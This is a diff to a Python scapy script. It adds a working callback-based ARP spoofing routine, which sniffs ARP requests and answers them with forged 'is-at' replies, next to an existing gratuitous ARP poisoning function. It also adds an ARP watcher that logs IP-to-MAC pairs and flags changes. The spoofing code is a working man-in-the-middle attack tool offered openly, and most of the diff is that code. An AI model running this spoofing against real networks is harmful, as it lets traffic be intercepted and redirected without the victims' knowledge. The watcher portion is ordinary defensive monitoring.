@@ -1,7 +1,7 @@
 import sys
 import time
-from scapy.all import sendp, ARP, Ether
-
+from scapy.all import sniff , sendp , ARP , Ether
+from signal import signal , SIGINT
 
 def grat_arp_poison(iface, target_ip, fake_ip):   
     print("Gratuitous ARP cache poisoning:")
@@ -13,11 +13,80 @@ def grat_arp_poison(iface, target_ip, fake_ip):
         sendp(packet , iface=iface)
         time.sleep(1)
 
-def callback_arp_poison(iface, target_ip, fake_ip):   
-    print("Callback ARP cache poisoning: Not implemented")
-#    ethernet = Ether()
-#    arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
-#    packet = ethernet / arp
-#    while True:
-#        sendp(packet , iface=iface)
-#        time.sleep(1)
+def callback_arp_poison_check(pkt, iface, target_ip, fake_ip):   
+    if pkt[ARP].op != 1:
+        return
+    elif target_ip != 0 and pkt[ARP].psrc != target_ip:
+        return
+    if fake_ip != 0 and pkt[ARP].pdst != fake_ip:
+        return
+    
+    answer = Ether(dst=pkt[ARP].hwsrc) / ARP()
+    answer[ARP].op = "is-at"
+    answer[ARP].hwdst = pkt[ARP].hwsrc
+    answer[ARP].psrc = pkt[ARP].pdst
+    answer[ARP].pdst = pkt[ARP].psrc
+
+    print ("Fooling " + pkt[ARP].psrc + " that " + pkt[ARP].pdst + " is me")
+
+    sendp(answer, iface=iface)
+
+def arp_poison_callback(iface, target_ip, fake_ip):
+    print("Callback ARP cache poisoning:")
+    sniff(prn=lambda pkt: callback_arp_poison_check(pkt, iface, target_ip, fake_ip), 
+	filter="arp", iface=iface, store=False)
+
+arp_watcher_db_file = "arp-watcher.db"
+ip_mac = {}
+
+# Save ARP table on shutdown
+def sig_int_handler(signum , frame):
+    print ("Got SIGINT. Saving ARP database ...")
+    try:
+        f = open(arp_watcher_db_file , "w")
+
+        for (ip , mac) in ip_mac.items ():
+            f.write(ip + " " + mac + "\n")
+
+        f.close ()
+        print (" Done.")
+    except IOError:
+        print (" Cannot write file " + arp_watcher_db_file )
+
+    sys.exit (1)
+
+
+def arp_watch_func(pkt):
+    # got is -at pkt (ARP response)
+    if pkt[ARP].op == 2:
+        print(pkt[ARP].hwsrc + " " + pkt[ARP].psrc)
+
+    # Device is new. Remember it.
+    if ip_mac.get(pkt[ARP].psrc) == None:
+        print (" Found new device " + pkt[ARP].hwsrc + " " + pkt[ARP].psrc)
+        ip_mac[pkt[ARP].psrc] = pkt[ARP]. hwsrc
+
+    # Device is known but has a different IP
+    elif ip_mac.get(pkt[ARP].psrc) and ip_mac[pkt[ARP].psrc] != pkt[ARP].hwsrc:
+        print(pkt[ARP].hwsrc + " has got new ip " + pkt[ARP].psrc + " (old " + ip_mac[pkt[ARP].psrc]+ ")")
+        ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc
+
+def apr_wacher(iface):
+    
+    signal(SIGINT, sig_int_handler)
+
+    if len(sys.argv) < 2:
+        print(sys.argv [0] + " <iface >")
+        sys.exit (0)
+
+    try:
+        fh = open(arp_watcher_db_file , "r")
+    except IOError:
+        print (" Cannot read file " + arp_watcher_db_file )
+        sys.exit (1)
+
+    for line in fh:
+        (ip , mac) = line.split(" ")
+        ip_mac[ip] = mac
+
+    sniff(prn=arp_watch_func, filter="arp", iface=iface, store=0)
